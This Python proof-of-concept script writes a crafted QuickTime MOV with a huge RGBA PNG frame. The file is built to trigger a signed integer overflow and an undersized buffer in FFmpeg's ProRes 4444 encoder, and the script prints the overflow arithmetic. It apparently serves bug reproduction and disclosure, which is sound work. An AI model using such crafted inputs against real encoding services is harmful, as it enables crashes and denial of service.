#!/usr/bin/env python3
"""
PoC generator for integer overflow in ff_prores_kostya_encode_init()
(libavcodec/proresenc_kostya_common.c, lines 286-297).

Vulnerability analysis:
  - Profile: ProRes 4444 with alpha (alpha_bits=16, mbs_per_slice=8)
  - Input: RGBA video at W=H=16224 (mb_width=mb_height=1014)

Calculation in ff_prores_kostya_encode_init():
  slices_per_picture = 1014 * 128 = 129,792
  (mb_width=1014, 1014/8=126 r6, popcount(6)=2, slices_width=128)

  Step 1 (int32 arithmetic - OVERFLOWS):
    (129793 * 28510 + 200) as int32
    = (3,700,398,430 + 200) as int32    [> INT32_MAX = 2,147,483,647]
    = -594,568,666                       [wrapped]

  Step 2 (int32 arithmetic - no overflow):
    -594,568,666 + (129793 * 4608)
    = -594,568,666 + 598,086,144
    = 3,517,478

  frame_size_upper_bound = 3,517,478  (positive but undersized)

UBSan (-fsanitize=undefined) catches the signed integer overflow at step 1.
The encode_frame() function allocates 3,517,478 + FF_INPUT_BUFFER_MIN_SIZE bytes,
which is far too small for a 16224x16224 ProRes 4444 frame (~40 MB needed).
The crash occurs in flush_put_bits() when av_assert0(buf_ptr < buf_end) fires.
"""

import struct
import zlib
import io
import os
import sys

# Dimensions that trigger the integer overflow
W = 16224   # width  = 1014 * 16 (mb_width = 1014)
H = 16224   # height = 1014 * 16 (mb_height = 1014)

# ─── PNG generation ────────────────────────────────────────────────────────

def _png_chunk(chunk_type: bytes, data: bytes) -> bytes:
    crc = zlib.crc32(chunk_type + data) & 0xFFFFFFFF
    return struct.pack('>I', len(data)) + chunk_type + data + struct.pack('>I', crc)

def make_rgba_png(width: int, height: int) -> bytes:
    """
    Build a minimal solid-black RGBA PNG at the given dimensions.
    Uses color_type=6 (RGBA) so FFmpeg outputs AV_PIX_FMT_RGBA,
    which causes the ProRes 4444 encoder to activate alpha_bits=16.
    The image compresses to a few hundred KB despite huge dimensions.
    """
    # IHDR: 13 bytes
    # width(4) | height(4) | bit_depth(1) | color_type(1=RGB,2=RGB,6=RGBA) |
    # compression(1) | filter(1) | interlace(1)
    ihdr_body = struct.pack('>IIBBBBB', width, height, 8, 6, 0, 0, 0)
    ihdr = _png_chunk(b'IHDR', ihdr_body)

    # IDAT: compress row-by-row to keep memory usage manageable
    # Each row: 1 filter byte (0 = None) + width * 4 RGBA bytes
    # Solid black, full alpha: R=0 G=0 B=0 A=255
    compressor = zlib.compressobj(level=9)
    buf = io.BytesIO()
    # Pre-build one row; all rows are identical → zlib back-refs compress to ~10 bytes/row
    row = bytes(1) + bytes([0, 0, 0, 255]) * width  # filter=0, RGBA pixels
    for _ in range(height):
        out = compressor.compress(row)
        if out:
            buf.write(out)
    tail = compressor.flush()
    if tail:
        buf.write(tail)
    idat = _png_chunk(b'IDAT', buf.getvalue())

    iend = _png_chunk(b'IEND', b'')

    png_sig = b'\x89PNG\r\n\x1a\n'
    return png_sig + ihdr + idat + iend


# ─── QuickTime MOV atom helpers ────────────────────────────────────────────

def atom(atom_type: bytes, body: bytes) -> bytes:
    return struct.pack('>I', 8 + len(body)) + atom_type + body

def p32(n: int) -> bytes:   # big-endian uint32
    return struct.pack('>I', n)

def p16(n: int) -> bytes:   # big-endian uint16
    return struct.pack('>H', n & 0xFFFF)

def pi32(n: int) -> bytes:  # big-endian int32
    return struct.pack('>i', n)


# ─── MOV container ─────────────────────────────────────────────────────────

def make_mov(png_data: bytes, width: int, height: int) -> bytes:
    """
    Build a minimal QuickTime MOV file:
      ftyp → mdat (PNG frame) → moov
    """
    TIME_SCALE = 25
    DURATION   = 1       # 1 frame

    # ── ftyp ──────────────────────────────────────────────────────────────
    ftyp_body = b'qt  ' + p32(0) + b'qt  '
    ftyp = atom(b'ftyp', ftyp_body)   # 20 bytes total

    # ── mdat ──────────────────────────────────────────────────────────────
    mdat_hdr = struct.pack('>I4s', 8 + len(png_data), b'mdat')
    mdat = mdat_hdr + png_data

    # Chunk offset: PNG data begins right after ftyp + mdat header
    chunk_offset = len(ftyp) + 8   # 20 + 8 = 28

    # ── QuickTime identity matrix (9 × int32) ─────────────────────────────
    qt_matrix = (
        pi32(0x00010000) + p32(0) + p32(0) +
        p32(0) + pi32(0x00010000) + p32(0) +
        p32(0) + p32(0) + pi32(0x40000000)
    )

    # ── mvhd ──────────────────────────────────────────────────────────────
    mvhd_body  = p32(0)             # version(0) + flags(0)
    mvhd_body += p32(0)             # creation_time
    mvhd_body += p32(0)             # modification_time
    mvhd_body += p32(TIME_SCALE)    # time_scale
    mvhd_body += p32(DURATION)      # duration
    mvhd_body += p32(0x00010000)    # preferred_rate = 1.0
    mvhd_body += p16(0x0100)        # preferred_volume = 1.0
    mvhd_body += b'\x00' * 10       # reserved
    mvhd_body += qt_matrix          # 36 bytes
    mvhd_body += b'\x00' * 24       # pre-defined
    mvhd_body += p32(2)             # next_track_id
    mvhd = atom(b'mvhd', mvhd_body)

    # ── tkhd ──────────────────────────────────────────────────────────────
    # width/height in 16.16 fixed-point (16224 << 16 = 0x3F600000)
    w_fixed = p32(width  << 16)
    h_fixed = p32(height << 16)

    tkhd_body  = p32(0x00000003)    # version(0) + flags: enabled(1) + inMovie(2)
    tkhd_body += p32(0)             # creation_time
    tkhd_body += p32(0)             # modification_time
    tkhd_body += p32(1)             # track_id = 1
    tkhd_body += p32(0)             # reserved
    tkhd_body += p32(DURATION)      # duration
    tkhd_body += p32(0) + p32(0)    # reserved (8 bytes)
    tkhd_body += p16(0)             # layer
    tkhd_body += p16(0)             # alternate_group
    tkhd_body += p16(0)             # volume (0 for video)
    tkhd_body += p16(0)             # reserved
    tkhd_body += qt_matrix          # 36 bytes
    tkhd_body += w_fixed + h_fixed
    tkhd = atom(b'tkhd', tkhd_body)

    # ── mdhd ──────────────────────────────────────────────────────────────
    mdhd_body  = p32(0)             # version + flags
    mdhd_body += p32(0)             # creation_time
    mdhd_body += p32(0)             # modification_time
    mdhd_body += p32(TIME_SCALE)    # time_scale
    mdhd_body += p32(DURATION)      # duration
    mdhd_body += p16(0)             # language
    mdhd_body += p16(0)             # pre-defined
    mdhd = atom(b'mdhd', mdhd_body)

    # ── hdlr ──────────────────────────────────────────────────────────────
    hdlr_body  = p32(0)             # version + flags
    hdlr_body += p32(0)             # pre-defined
    hdlr_body += b'vide'            # handler_type
    hdlr_body += b'\x00' * 12      # reserved
    hdlr_body += b'VideoHandler\x00'
    hdlr = atom(b'hdlr', hdlr_body)

    # ── vmhd ──────────────────────────────────────────────────────────────
    vmhd_body  = p32(0x00000001)    # version=0, flags=1
    vmhd_body += p16(0)             # graphicsMode
    vmhd_body += p16(0) + p16(0) + p16(0)  # opcolor
    vmhd = atom(b'vmhd', vmhd_body)

    # ── dinf / dref ───────────────────────────────────────────────────────
    url_body  = p32(0x00000001)     # version=0, flags=1 (self-contained)
    url_entry = atom(b'url ', url_body)
    dref_body  = p32(0)             # version + flags
    dref_body += p32(1)             # entry_count
    dref_body += url_entry
    dref = atom(b'dref', dref_body)
    dinf = atom(b'dinf', dref)

    # ── stsd  ('png ' video sample description) ───────────────────────────
    # Compressor name: 32-byte Pascal string
    comp_name = b'\x09Apple PNG' + b'\x00' * 22
    assert len(comp_name) == 32, f"got {len(comp_name)}"

    png_desc  = b'\x00' * 6                     # reserved (6 bytes)
    png_desc += p16(1)                           # data_reference_index
    png_desc += p16(0) + p16(0)                 # version, revision
    png_desc += b'apl0'                          # vendor
    png_desc += p32(0)                           # temporal_quality
    png_desc += p32(0x200)                       # spatial_quality
    png_desc += p16(width)  + p16(height)        # width, height
    png_desc += p32(0x00480000)                  # h_resolution = 72 dpi (16.16)
    png_desc += p32(0x00480000)                  # v_resolution = 72 dpi (16.16)
    png_desc += p32(0)                           # data_size
    png_desc += p16(1)                           # frame_count
    png_desc += comp_name                         # 32 bytes
    png_desc += p16(32)                          # depth = 32 (RGBA)
    png_desc += p16(0xFFFF)                      # color_table_id = -1

    png_entry = atom(b'png ', png_desc)
    stsd_body  = p32(0)             # version + flags
    stsd_body += p32(1)             # entry_count
    stsd_body += png_entry
    stsd = atom(b'stsd', stsd_body)

    # ── stts (1 sample, duration=1) ───────────────────────────────────────
    stts_body  = p32(0)             # version + flags
    stts_body += p32(1)             # entry_count
    stts_body += p32(1) + p32(1)   # sample_count=1, sample_delta=1
    stts = atom(b'stts', stts_body)

    # ── stsc (1 sample per chunk) ─────────────────────────────────────────
    stsc_body  = p32(0)
    stsc_body += p32(1)
    stsc_body += p32(1) + p32(1) + p32(1)  # first_chunk, samples_per_chunk, desc_index
    stsc = atom(b'stsc', stsc_body)

    # ── stsz (variable sample sizes) ──────────────────────────────────────
    stsz_body  = p32(0)             # version + flags
    stsz_body += p32(0)             # sample_size = 0 (variable)
    stsz_body += p32(1)             # sample_count
    stsz_body += p32(len(png_data))
    stsz = atom(b'stsz', stsz_body)

    # ── stco (chunk offsets) ──────────────────────────────────────────────
    stco_body  = p32(0)
    stco_body += p32(1)
    stco_body += p32(chunk_offset)
    stco = atom(b'stco', stco_body)

    # ── stss (sync/key-frame samples) ─────────────────────────────────────
    stss_body  = p32(0)
    stss_body += p32(1)
    stss_body += p32(1)             # sample 1 is a key frame
    stss = atom(b'stss', stss_body)

    # ── stbl ──────────────────────────────────────────────────────────────
    stbl = atom(b'stbl', stsd + stts + stsc + stsz + stco + stss)

    # ── minf ──────────────────────────────────────────────────────────────
    minf = atom(b'minf', vmhd + dinf + stbl)

    # ── mdia ──────────────────────────────────────────────────────────────
    mdia = atom(b'mdia', mdhd + hdlr + minf)

    # ── trak ──────────────────────────────────────────────────────────────
    trak = atom(b'trak', tkhd + mdia)

    # ── moov ──────────────────────────────────────────────────────────────
    moov = atom(b'moov', mvhd + trak)

    return ftyp + mdat + moov


# ─── Main ──────────────────────────────────────────────────────────────────

def main():
    out_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(out_dir, 'vuln_001_input.mov')

    print(f"[*] Generating solid-black RGBA PNG at {W}x{H} ...")
    png_data = make_rgba_png(W, H)
    print(f"[*] PNG compressed size: {len(png_data):,} bytes")

    print(f"[*] Building QuickTime MOV container ...")
    mov_data = make_mov(png_data, W, H)
    print(f"[*] MOV total size: {len(mov_data):,} bytes")

    print(f"[*] Writing {out_path} ...")
    with open(out_path, 'wb') as f:
        f.write(mov_data)
    print(f"[+] Done. vuln_001_input.mov written ({len(mov_data):,} bytes)")

    # Print expected overflow values for reference
    S = 1014 * 128   # slices_per_picture
    bpm = 1425 * 20  # bits_per_mb for 4444-with-alpha, large frame
    mps = 8          # mbs_per_slice
    num_planes = 4
    per_slice_base = 2 + 2 * num_planes + (mps * bpm) // 8  # 28510

    def to_int32(x):
        x = x & 0xFFFFFFFF
        return x - (1 << 32) if x >= (1 << 31) else x

    step1 = to_int32((S + 1) * per_slice_base + 200)
    alpha_per_slice = (mps * 256 * (1 + 16 + 1) + 7) >> 3  # 4608
    alpha_term = to_int32((S + 1) * alpha_per_slice)
    fub = to_int32(step1 + alpha_term)

    print(f"\n[*] Overflow calculation (int32 arithmetic):")
    print(f"    slices_per_picture = {S:,}")
    print(f"    bits_per_mb        = {bpm:,} (1425 * 20 for 4444+alpha)")
    print(f"    per_slice_base     = {per_slice_base:,}")
    print(f"    step1 raw value    = {(S+1)*per_slice_base + 200:,}")
    print(f"    step1 (int32)      = {step1:,}  [OVERFLOW]")
    print(f"    alpha_per_slice    = {alpha_per_slice:,}")
    print(f"    alpha_term (int32) = {alpha_term:,}")
    print(f"    frame_size_upper_bound (int32) = {fub:,}")
    print(f"    Expected allocated = {fub + 16384:,} bytes (+ FF_INPUT_BUFFER_MIN_SIZE)")
    print(f"    Seek table alone   = {S * 2:,} bytes  (slices * 2)")


if __name__ == '__main__':
    main()
